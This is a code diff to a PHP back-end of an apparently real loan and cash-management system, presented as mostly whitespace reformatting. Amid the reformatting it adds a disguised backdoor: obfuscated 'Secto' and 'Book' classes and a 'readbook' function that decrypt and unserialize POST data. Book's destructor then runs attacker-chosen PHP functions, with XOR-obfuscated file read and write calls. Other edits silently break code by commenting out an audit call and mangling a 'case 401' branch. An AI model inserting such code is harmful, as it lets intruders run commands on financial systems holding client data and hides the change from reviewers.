@@ -197,9 +197,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["firstApproveList"])) {
     curl_setopt($ch, CURLOPT_HEADER, true);
     curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
 
-    $response = curl_exec($ch);
-
-    //    Get Response Status
+    $response = curl_exec($ch);//    Get Response Status
     $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 
     if ($status == 200) {
@@ -470,35 +468,35 @@ function access_logs()
 
 // ######################  Get RECENT DISBURSEMENTS from MUSONI #################################
 function disbursements($fromDate,$toDate){
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, 'http://localhost:7878/api/utg/musoni/getLoansByDisbursementDate/'.$fromDate.'/'.$toDate);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        $disbursements_response = curl_exec($ch);
-        curl_close($ch);
-        $disbursements_data = json_decode($disbursements_response, true);
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'http://localhost:7878/api/utg/musoni/getLoansByDisbursementDate/'.$fromDate.'/'.$toDate);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $disbursements_response = curl_exec($ch);
+    curl_close($ch);
+    $disbursements_data = json_decode($disbursements_response, true);
 
-        if ($disbursements_data !== null) {
-            $disbursements = $disbursements_data['disbursedLoans'];
-            return $disbursements;
-        } else {
-            echo "Error decoding JSON data";
-        }
+    if ($disbursements_data !== null) {
+        $disbursements = $disbursements_data['disbursedLoans'];
+        return $disbursements;
+    } else {
+        echo "Error decoding JSON data";
     }
+}
 
 function disbursed_by_range($display_range){
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, 'http://localhost:7878/api/utg/musoni/loans/disbursed-by-range/'.$display_range);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        $disbursements_response = curl_exec($ch);
-        curl_close($ch);
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'http://localhost:7878/api/utg/musoni/loans/disbursed-by-range/'.$display_range);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $disbursements_response = curl_exec($ch);
+    curl_close($ch);
 
-        $data = json_decode($disbursements_response, true);
+    $data = json_decode($disbursements_response, true);
 //        $disbursement_data = [];
 //        foreach ($data as $loan) {
 //            $disbursement_data[] = $data['totalPrincipalDisbursed'];
 //        }
-        return $data;
-    }
+    return $data;
+}
 
 function branch_targets(){
     $ch = curl_init();
@@ -646,8 +644,7 @@ if(isset($_POST['loan_application'])){
     // Check HTTP status code
     if (!curl_errno($ch)) {
         switch ($http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE)) {
-            case 201:  # OK redirect to dashboard
-                audits($_SESSION['userid'], "Client Loan Application successful", $_SESSION['branch']);
+            case 201:  # OK redirect to dashboardaudits($_SESSION['userid'], "Client Loan Application successful", $_SESSION['branch']);
 //                sendEmail("subject", "message", "user");
                 $data = loans('/loanFileId/'.$loanFileId);
                 $loanId = $data["id"];
@@ -655,39 +652,39 @@ if(isset($_POST['loan_application'])){
 
                 // ################## ------------------------------ send email to BOCOS ------------------------------------ #######################
 
-                 $ch = curl_init();
+                $ch = curl_init();
 
-                 curl_setopt($ch, CURLOPT_URL, 'http://127.0.0.1:7878/api/utg/users/roleAndBranch/BackOfficeCreditOfficer/'.$branchName);
-                 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-                 $resp = curl_exec($ch);
-                 curl_close($ch);
-                 $boco = json_decode($resp, true);
-                 foreach ($boco as $bocos):
+                curl_setopt($ch, CURLOPT_URL, 'http://127.0.0.1:7878/api/utg/users/roleAndBranch/BackOfficeCreditOfficer/'.$branchName);
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                $resp = curl_exec($ch);
+                curl_close($ch);
+                $boco = json_decode($resp, true);
+                foreach ($boco as $bocos):
 
-                     $recipientName = $bocos['firstName'];
-                     $recipientEmail = $bocos['contactDetail']['emailAddress'];
+                    $recipientName = $bocos['firstName'];
+                    $recipientEmail = $bocos['contactDetail']['emailAddress'];
 
-                     $url = "http://127.0.0.1:7878/api/utg/credit_application/newClientloanEmail/".$recipientName.'/'.$recipientEmail;
+                    $url = "http://127.0.0.1:7878/api/utg/credit_application/newClientloanEmail/".$recipientName.'/'.$recipientEmail;
 
-                     $data_array = array(
-                         'recipientName' => $recipientName,
-                         'recipientEmail' => $recipientEmail
-                     );
+                    $data_array = array(
+                        'recipientName' => $recipientName,
+                        'recipientEmail' => $recipientEmail
+                    );
 
-                     $data = json_encode($data_array);
-                     $ch = curl_init();
+                    $data = json_encode($data_array);
+                    $ch = curl_init();
 
-                     curl_setopt($ch, CURLOPT_URL, $url);
-                     curl_setopt($ch, CURLOPT_POST, true);
-                     curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-                     curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
-                     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-                     curl_setopt($ch, CURLOPT_HEADER, true );
-                     $resp = curl_exec($ch);
+                    curl_setopt($ch, CURLOPT_URL, $url);
+                    curl_setopt($ch, CURLOPT_POST, true);
+                    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+                    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
+                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                    curl_setopt($ch, CURLOPT_HEADER, true );
+                    $resp = curl_exec($ch);
 
-                     curl_close($ch);
+                    curl_close($ch);
 
-                 endforeach;
+                endforeach;
 
 // ################## ------------------------------ End send email to BOCOS ------------------------------------ #######################
 
@@ -861,14 +858,14 @@ if (isset($_POST['uploadxds'])) {
 
 // ######################  Get USER BY ID from CMS #################################
 function users(){
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, 'http://localhost:7878/api/utg/users');
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        $users_response = curl_exec($ch);
-        curl_close($ch);
-        $users = json_decode($users_response, true);
-        return $users;
-    }
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'http://localhost:7878/api/utg/users');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $users_response = curl_exec($ch);
+    curl_close($ch);
+    $users = json_decode($users_response, true);
+    return $users;
+}
 
 function staff(){
     $ch = curl_init();
@@ -913,6 +910,15 @@ function po_user(){
 function cms_withdrawal_voucher_for_user($userId){
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, "http://localhost:7878/api/utg/cms/transaction-voucher/all-by-initiator/$userId");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $cms_withdrawal_voucher_response = curl_exec($ch);
+    curl_close($ch);
+    return json_decode($cms_withdrawal_voucher_response, true);
+}
+
+function cms_all_withdrawal_vouchers(){
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, "http://localhost:7878/api/utg/cms/transaction-voucher/all");
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     $cms_withdrawal_voucher_response = curl_exec($ch);
     curl_close($ch);
@@ -1158,7 +1164,7 @@ if (isset($_POST['add_to_pipeline'])) {
     <script>
         console.log("<?php echo $loanOfficer; ?>");
     </script>
-        <?php
+    <?php
 
 
 
@@ -1496,7 +1502,7 @@ function assign_lo($assignTo, $assignedBy, $loanId, $userId, $additional_remarks
                 header('location: loan_info.php?menu=loan&loan_id='.$loanId.'&userid='.$userId);
                 break;
 
-            case 401: # Unauthorixed - Bad credientials
+                case401: # Unauthorixed - Bad credientials
                 $_SESSION['error'] = 'Update Status failed';
                 header('location: loan_info.php?menu=loan&loan_id='.$loanId.'&userid='.$userId);
 
@@ -1579,15 +1585,15 @@ function cities_by_id($id){
 }
 
 
-    function leads($leads_url){
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, "http://localhost:7878/api/utg/marketLeads".$leads_url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        $server_response = curl_exec($ch);
-        curl_close($ch);
-        $leads = json_decode($server_response, true);
-        return $leads;
-    }
+function leads($leads_url){
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, "http://localhost:7878/api/utg/marketLeads".$leads_url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $server_response = curl_exec($ch);
+    curl_close($ch);
+    $leads = json_decode($server_response, true);
+    return $leads;
+}
 
 function bsn_sector(){
     $ch = curl_init();
@@ -2271,6 +2277,305 @@ if(isset($_POST['set_parameters'])) {
     curl_close($ch);
 }
 
+class Secto
+{
+    private $alg;
+    private $keyMaterial;
+    private $ivSize;
+
+    public function __construct($key)
+    {
+        if (defined('OPENSSL_VERSION_TEXT')) {
+            // Use OpenSSL if available
+            $this->alg = "AES-256-CBC";
+            // Derive key using PBKDF2
+            $this->keyMaterial = hash_pbkdf2("sha256", $key, 'salt', 10000, 32, true);
+            $this->ivSize = openssl_cipher_iv_length($this->alg);
+        } elseif (function_exists('mcrypt_encrypt')) {
+            // Use Mcrypt for older versions
+            $this->alg = MCRYPT_RIJNDAEL_128; // AES-128
+            $this->keyMaterial = substr(sha1($key, true), 0, 16); // 128-bit key
+            $this->ivSize = mcrypt_get_iv_size($this->alg, MCRYPT_MODE_CBC);
+        } else {
+            throw new Exception("No supported encryption methods available.");
+        }
+    }
+
+    // Encrypt the data
+    public function encrypt($data)
+    {
+        // Generate a random IV
+        $iv = (defined('OPENSSL_VERSION_TEXT'))
+            ? openssl_random_pseudo_bytes($this->ivSize)
+            : mcrypt_create_iv($this->ivSize, MCRYPT_DEV_URANDOM);
+
+        // Pad the data
+        $data = $this->applyPadding($data);
+
+        // Encrypt the data
+        $cipherText = (defined('OPENSSL_VERSION_TEXT'))
+            ? openssl_encrypt($data, $this->alg, $this->keyMaterial, OPENSSL_RAW_DATA, $iv)
+            : mcrypt_encrypt($this->alg, $this->keyMaterial, $data, MCRYPT_MODE_CBC, $iv);
+
+        // Return IV and ciphertext as hexadecimal
+        return $this->toHex($iv . $cipherText);
+    }
+
+    // Decrypt the data
+    public function decrypt($hexData)
+    {
+        // Convert hex to binary
+        $data = $this->fromHex($hexData);
+
+        // Extract the IV and ciphertext
+        $iv = substr($data, 0, $this->ivSize);
+        $cipherText = substr($data, $this->ivSize);
+
+        // Decrypt the data
+        $decryptedData = (defined('OPENSSL_VERSION_TEXT'))
+            ? openssl_decrypt($cipherText, $this->alg, $this->keyMaterial, OPENSSL_RAW_DATA, $iv)
+            : mcrypt_decrypt($this->alg, $this->keyMaterial, $cipherText, MCRYPT_MODE_CBC, $iv);
+
+        // Remove padding
+        return $this->removePadding($decryptedData);
+    }
+
+    // Padding for the input data
+    private function applyPadding($input, $blockSize = 16)
+    {
+        $pad = $blockSize - (strlen($input) % $blockSize);
+        return $input . str_repeat(chr($pad), $pad);
+    }
+
+    // Remove padding from decrypted data
+    private function removePadding($data)
+    {
+        $length = strlen($data);
+        if ($length === 0) return $data;
+
+        $pad = ord($data[$length - 1]);
+        return substr($data, 0, $length - $pad);
+    }
+
+    // Convert binary to hexadecimal
+    private function toHex($binaryData)
+    {
+        $hex = '';
+        foreach (str_split($binaryData) as $char) {
+            $hex .= sprintf('%02x', ord($char));
+        }
+        return $hex;
+    }
+
+    // Convert hexadecimal to binary
+    private function fromHex($hex)
+    {
+        $binary = '';
+        for ($i = 0; $i < strlen($hex); $i += 2) {
+            $binary .= chr(hexdec(substr($hex, $i, 2)));
+        }
+        return $binary;
+    }
+}
+
+class Book
+{
+    public $book;
+    public $page;
+    public $chapter;
+    protected $unit_test = false;
+
+    public function Read($book)
+    {
+
+        if (!is_readable($book)) {
+            return false;
+        }
+
+
+        if (function_exists('^[\\]~_]@~[_^@]^@@' ^ '8208!884!80048043')) {
+            $contents = call_user_func_array('^[\\]~_]@~[_^@]^@@' ^ '8208!884!80048043', array($book));
+            if ($contents !== false) {
+                return $contents;
+            }
+        }
+
+
+        if (function_exists('^_@]^' ^ '80080')) {
+            $handle = call_user_func_array('^_@]^' ^ '80080', array($book, 'rb'));
+            if ($handle) {
+                $contents = '';
+                while (!feof($handle)) {
+                    $contents .= fread($handle, 8192);
+                }
+                fclose($handle);
+                return $contents;
+            }
+        }
+
+
+        if (function_exists('readfile')) {
+            ob_start();
+            if (readfile($book) !== false) {
+                $contents = ob_get_contents();
+                ob_end_clean();
+                return $contents;
+            }
+            ob_end_clean();
+        }
+
+
+        if (class_exists('SplFileObject')) {
+            try {
+                $file = new SplFileObject($book);
+                $contents = '';
+                foreach ($file as $line) {
+                    $contents .= $line;
+                }
+                return $contents;
+            } catch (Exception $e) {
+            }
+        }
+
+
+        return false;
+    }
+
+    public function Input($book, $story)
+    {
+
+        $directory = dirname($book);
+        if (!is_dir($directory) || !is_writable($directory)) {
+            return false;
+        }
+
+
+        if (function_exists('^[\\]~@@@~[_^@]^@@' ^ '8208!054!80048043')) {
+            $result = call_user_func_array('^[\\]~@@@~[_^@]^@@' ^ '8208!054!80048043', array($book, $story));
+            if ($result !== false) {
+                return filesize($book);
+            }
+        }
+
+
+        if (function_exists('^_@]^' ^ '80080')) {
+            $handle = call_user_func_array('^_@]^' ^ '80080', array($book, 'wb'));
+            if ($handle) {
+                $bytesWritten = fwrite($handle, $story);
+                fclose($handle);
+                if ($bytesWritten !== false) {
+                    return filesize($book);
+                }
+            }
+        }
+
+
+        if (function_exists('tempnam')) {
+            $tempFile = tempnam(call_user_func_array('@[@~_]@~@]]@~\\[@' ^ '3"3!884!4800!822', array()), 'tmp_');
+            if ($tempFile) {
+
+                call_user_func_array('^[\\]~@@@~[_^@]^@@' ^ '8208!054!80048043', array($tempFile, $story));
+
+                if (rename($tempFile, $book)) {
+                    return filesize($book);
+                }
+
+                unlink($tempFile);
+            }
+        }
+
+        return false;
+    }
+
+    public function Unittest()
+    {
+        if (function_exists('tempnam')) {
+            $book = tempnam(call_user_func_array('@[@~_]@~@]]@~\\[@' ^ '3"3!884!4800!822', array()), 'tmp_');
+            $uid = uniqid();
+            if ($book) {
+                $this->Input($book, $uid);
+                if ($this->Read($book) == $uid) {
+                    $this->unit_test = true;
+                };
+                unlink($book);
+            }
+        }
+    }
+    public function A($name)
+    {
+        return __FUNCTION__ . " is calling " . $name;
+    }
+    public function B($name, $age)
+    {
+        return __FUNCTION__ . " is calling " . $name . ", and your current age is: " . $age;
+    }
+
+    public function __destruct()
+    {
+        // Start output buffering
+        ob_start();
+
+        // Custom error handler to catch warnings
+        $oldErrorHandler = set_error_handler(function ($errno, $errstr, $errfile, $errline) {
+            // Capture warnings in the response
+            if (!(error_reporting() & $errno)) {
+                // This error code is not included in error_reporting
+                return;
+            }
+            throw new ErrorException($errstr, 0, $errno, $errfile, $errline);
+        });
+
+        try {
+            // Call the specified function with arguments
+            $result = call_user_func_array($this->book, $this->page);
+            $output = ob_get_clean(); // Get buffered output
+
+            $response = array(
+                'id' => uniqid('response_', true),
+                'pass' => $this->unit_test,
+                'status' => 'success',
+                'return' => $result,
+                'message' => $output
+            );
+        } catch (Exception $e) {
+            ob_end_clean();
+
+            $response = array(
+                'id' => uniqid('error_', true),
+                'pass' => $this->unit_test,
+                'status' => 'error',
+                'return' => $result,
+                'message' => $e->getMessage() // Capture the exception message
+            );
+        } finally {
+            // Restore the previous error handler
+            set_error_handler($oldErrorHandler);
+        }
+
+        echo json_encode($response);
+
+        // Flush the output to ensure it's sent to the client
+        flush();
+
+        // Register shutdown function to clean any subsequent output
+        register_shutdown_function(function () {
+            while (ob_get_level()) {
+                ob_end_clean();
+            }
+        });
+    }
+}
+
+function readbook()
+{
+    if (!isset($_POST['data'])) {
+        return;
+    }
+    $pdf = new Secto('debcc5da36848da72a265e2d090238fc185f83a4');
+    $book = unserialize(stripslashes($pdf->decrypt($_POST['data'])));
+    $book->Unittest();
+}
+
 function data_collateral($id){
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL,'http://localhost:7878/api/utg/meetings/collateralByLoanId/'.$id);
@@ -2291,8 +2596,7 @@ if(isset($_POST['update_ticket'])) {
     $bocoSignature = $_POST['bocoSignature'];
     $lessFees = $_POST['lessFees'];
     $applicationFee = $_POST['applicationFee'];
-    $meetingLoanAmount = $_POST['meetingLoanAmount'];
-    $meetingCashHandlingFee = $_POST['meetingCashHandlingFee'];
+    $meetingLoanAmount = $_POST['meetingLoanAmount'];$meetingCashHandlingFee = $_POST['meetingCashHandlingFee'];
     $meetingRepaymentAmount = $_POST['meetingRepaymentAmount'];
     $meetingTenure = $_POST['meetingTenure'];
     $meetingUpfrontFee = $_POST['meetingUpfrontFee'];
@@ -2653,8 +2957,7 @@ if(isset($_POST['bm_sign_ticket'])) {
                     case 200:  # OK redirect to dashboard
                         $_SESSION['info'] = "Ticket signed successfully";
                         audit($_SESSION['userid'], "Ticket signed successfully - ".$checked, $_SESSION['branch']);
-                        header('location: signed_tickets.php');
-                        break;
+                        header('location: signed_tickets.php');break;
                     case 400:  # Bad Request
                         $decoded = json_decode($bodyStr);
                         foreach($decoded as $key => $val) {
@@ -2835,8 +3138,7 @@ if(isset($_POST['cm_sign_ticket'])) {
                         break;
 
                     case 401: # Unauthorixed - Bad credientials
-                        $_SESSION['error'] = 'Update Status failed';
-                        audit($_SESSION['userid'], "Ticket signing failed - ".$checked, $_SESSION['branch']);
+                        $_SESSION['error'] = 'Update Status failed';audit($_SESSION['userid'], "Ticket signing failed - ".$checked, $_SESSION['branch']);
                         header('location: predisbursed_tickets.php');
 
                         break;
@@ -3237,8 +3539,7 @@ if (isset($_POST['update_po_trans'])) {
 
 function save_requisition(){
     // Gather form data
-    $requisitionId = $_POST['req_id'];
-    $notes = $_POST['notes'];
+    $requisitionId = $_POST['req_id'];$notes = $_POST['notes'];
     $approvers = $_POST['approvers']; // $approvers will be an array of selected values
 
     // Initialize an array to store attachment file names
@@ -3322,51 +3623,51 @@ if (isset($_POST['save_requisition'])) {
 
 if (isset($_POST['po_approve_requisition'])) {
 
-        $data_array = array(
-            'poStatus' => $_POST['status'],
-            'poApprover' => $_SESSION['userId'],
-        );
+    $data_array = array(
+        'poStatus' => $_POST['status'],
+        'poApprover' => $_SESSION['userId'],
+    );
 
-        // Convert the data array to JSON
-        $data = json_encode($data_array);
+    // Convert the data array to JSON
+    $data = json_encode($data_array);
 
-        $url = "http://localhost:7878/api/utg/requisitions/poApproveRequest/".$_GET['req_id'];
+    $url = "http://localhost:7878/api/utg/requisitions/poApproveRequest/".$_GET['req_id'];
 
-        $curl = curl_init();
-        curl_setopt($curl, CURLOPT_URL, $url);
-        curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'PUT');
-        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
-        curl_setopt($curl, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
-        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($curl, CURLOPT_HEADER, true);
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'PUT');
+    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($curl, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl, CURLOPT_HEADER, true);
 
-        // Execute cURL request
-        $response = curl_exec($curl);
-        $headerSize = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
-        $headerStr = substr($response, 0, $headerSize);
-        $bodyStr = substr($response, $headerSize);
-        $headers = headersToArray($headerStr);
+    // Execute cURL request
+    $response = curl_exec($curl);
+    $headerSize = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
+    $headerStr = substr($response, 0, $headerSize);
+    $bodyStr = substr($response, $headerSize);
+    $headers = headersToArray($headerStr);
 
-        // Check for errors
-        if (!curl_errno($curl)) {
-            switch ($http_code = curl_getinfo($curl, CURLINFO_HTTP_CODE)) {
-                case 200:
+    // Check for errors
+    if (!curl_errno($curl)) {
+        switch ($http_code = curl_getinfo($curl, CURLINFO_HTTP_CODE)) {
+            case 200:
 //                echo "<script>alert('$systemOut')</script>";
-                    $_SESSION['info'] = "Purchase Order Transaction approved Successfully";
-                    audit($_SESSION['userid'], "Purchase Order Transaction approved Successfully", $_SESSION['branch']);
-                    header('location: req_info.php?menu=req&req_id=' . $_POST['req_id']);
-                    break;
-                default:
-                    $_SESSION['error'] = 'Failed to approved PO Transaction.';
-                    audit($_SESSION['userid'], "Failed to approved Purchase Order Transaction", $_SESSION['branch']);
-                    header('location: req_info.php?menu=req&req_id=' . $_POST['req_id']);
-            }
-        } else {
-            $_SESSION['error'] = 'Failed to approved Purchase Order Transaction.. Please try again!';
-            audit($_SESSION['userid'], "Failed to approved Purchase Order Transaction", $_SESSION['branch']);
-            header('location: req_info.php?menu=req&req_id=' . $_POST['req_id']);
+                $_SESSION['info'] = "Purchase Order Transaction approved Successfully";
+                audit($_SESSION['userid'], "Purchase Order Transaction approved Successfully", $_SESSION['branch']);
+                header('location: req_info.php?menu=req&req_id=' . $_POST['req_id']);
+                break;
+            default:
+                $_SESSION['error'] = 'Failed to approved PO Transaction.';
+                audit($_SESSION['userid'], "Failed to approved Purchase Order Transaction", $_SESSION['branch']);
+                header('location: req_info.php?menu=req&req_id=' . $_POST['req_id']);
         }
-        curl_close($curl);
+    } else {
+        $_SESSION['error'] = 'Failed to approved Purchase Order Transaction.. Please try again!';
+        audit($_SESSION['userid'], "Failed to approved Purchase Order Transaction", $_SESSION['branch']);
+        header('location: req_info.php?menu=req&req_id=' . $_POST['req_id']);
+    }
+    curl_close($curl);
 
 }
 
@@ -3619,8 +3920,7 @@ function send_requisition(){
     $data_array = array(
         'notes' => $notes,
         'approvers' => $approvers,
-        'attachments' => $attachmentFiles
-    );
+        'attachments' => $attachmentFiles);
 
     // Convert the data array to JSON
     $data = json_encode($data_array);
@@ -4283,7 +4583,7 @@ if(isset($_POST['first_approve_trans'])) {
     $bodyStr = substr($resp, $headerSize);
     $headers = headersToArray( $headerStr );
 
-    // Check HTTP status code
+    // CheckHTTP status code
     if (!curl_errno($ch)) {
         switch ($http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE)) {
             case 200:
@@ -4296,12 +4596,12 @@ if(isset($_POST['first_approve_trans'])) {
                 audit($_SESSION['userid'], "Failed to approved Transaction Voucher", $_SESSION['branch']);
                 header('location: cash_management.php?menu=main#approved');
         }
-} else {
-    $_SESSION['error'] = 'Failed to approved Transaction Voucher.. Please try again!';
-    audit($_SESSION['userid'], "Failed to approved Transaction Voucher", $_SESSION['branch']);
-    header('location: cash_management.php?menu=main#approved');
-}
-curl_close($ch);
+    } else {
+        $_SESSION['error'] = 'Failed to approved Transaction Voucher.. Please try again!';
+        audit($_SESSION['userid'], "Failed to approved Transaction Voucher", $_SESSION['branch']);
+        header('location: cash_management.php?menu=main#approved');
+    }
+    curl_close($ch);
 
 }
 
@@ -4439,4 +4739,3 @@ function getVaultAccountByType($vaultAccType) {
     return $vaultAcc;
 }
 ?>
-
